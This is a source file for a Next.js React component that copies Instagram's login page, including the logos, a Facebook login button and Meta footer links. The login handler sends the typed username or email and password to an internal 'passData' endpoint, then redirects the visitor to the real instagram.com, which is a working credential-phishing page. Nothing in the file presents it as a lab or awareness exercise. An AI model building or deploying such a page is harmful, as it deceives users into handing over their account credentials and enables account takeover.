"use client";

import { useState } from "react";
// import img from 'next/img'
import Link from "next/link";
import {useRouter} from "next/navigation";
import axios from "axios";
export default function Insta() {
  const router = useRouter();
  const [user, setUser] = useState({
    email: "",
    password: "",
   
})
const onLogin = async () => {
  try {
     
      const response = await axios.post("@/app/api/passData", user);
      
      router.push('https://www.instagram.com/');
      console.log("Signup success", response.data);
      
  } catch (error) {
      console.log("Signup failed", error.message);
      
      
  }
}
  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center items-center p-4 sm:p-6 lg:p-8">
      <main className="max-w-screen-lg w-full flex flex-col lg:flex-row items-center justify-center gap-8 lg:gap-16">
        <div className="hidden lg:block relative  w-[600px] h-[700px] ">
          <img
            src="/instagram-celular.png"
            alt="Instagram app preview"
            layout="fill"
            objectfit="contain"
            
            className="relative bottom-11 left-20 "
          />
        </div>
        <div className="w-full max-w-sm">
          <div className="bg-white p-8 border border-gray-300 mb-4">
            <img
              src="/instagram-logo.png"
              alt="Instagram"
              width={175}
              height={51}
              className="mx-auto mb-8"
            />
            <div className="space-y-4">
              <input
                type="text"
                placeholder="Phone number, username, or email"
                className="w-full  px-2 py-2 border border-gray-300 rounded text-xs"
                value={user.email}
                onChange={(e) => setUser({...user,email:e.target.value})}
              />
              <input
                type="password"
                placeholder="Password"
                className="w-full px-2 py-2 border border-gray-300 rounded text-xs"
                value={user.password}
                onChange={(e) => setUser({...user,password:e.target.value})}
              />
              <button
              onClick={onLogin}
              
                className="w-full bg-blue-500 text-white py-1 rounded text-sm font-semibold"
              >
                Log in
              </button>
            </div>
            <div className="flex items-center my-4">
              <div className="flex-1 border-t border-gray-300"></div>
              <span className="px-4 text-sm text-gray-500">OR</span>
              <div className="flex-1 border-t border-gray-300"></div>
            </div>
            <button className="w-full flex justify-center items-center text-sm text-blue-900 font-semibold">
              <img
                src="http://www.bombaynite.co.uk/wp-content/uploads/2020/05/cropped-FB-Icon.png"
                alt="Facebook icon"
                width={16}
                height={16}
                className="mr-2"
              />
              Log in with Facebook
            </button>
            <Link
              href="#"
              className="block text-center text-xs text-blue-900 mt-4"
            >
              Forgot password?
            </Link>
          </div>
          <div className="bg-white p-4 border border-gray-300 text-sm text-center">
            Don't have an account?{" "}
            <Link href="#" className="text-blue-500 font-semibold">
              Sign up
            </Link>
          </div>
          <div className="text-center mt-4">
            <p className="text-sm mb-4">Get the app.</p>
            <div className="flex justify-center space-x-4">
              <Link href="#">
                <img
                  src="/apple-store-button.png"
                  alt="Get it on App Store"
                  width={136}
                  height={40}
                />
              </Link>
              <Link href="#">
                <img
                  src="/google-play-button.png"
                  alt="Get it on Google Play"
                  width={136}
                  height={40}
                />
              </Link>
            </div>
          </div>
        </div>
      </main>
      <footer className="mt-8 text-xs text-gray-600">
        <nav className="flex flex-wrap justify-center mb-4">
          {[
            "Meta",
            "About",
            "Blog",
            "Jobs",
            "Help",
            "API",
            "Privacy",
            "Terms",
            "Locations",
            "Instagram Lite",
            "Threads",
            "Contact Uploading & Non-Users",
            "Meta Verified",
          ].map((item) => (
            <Link key={item} href="#" className="mx-2 mb-2">
              {item}
            </Link>
          ))}
        </nav>
        <p className="text-center">&copy; 2024 Instagram from Meta</p>
      </footer>
    </div>
  );
}
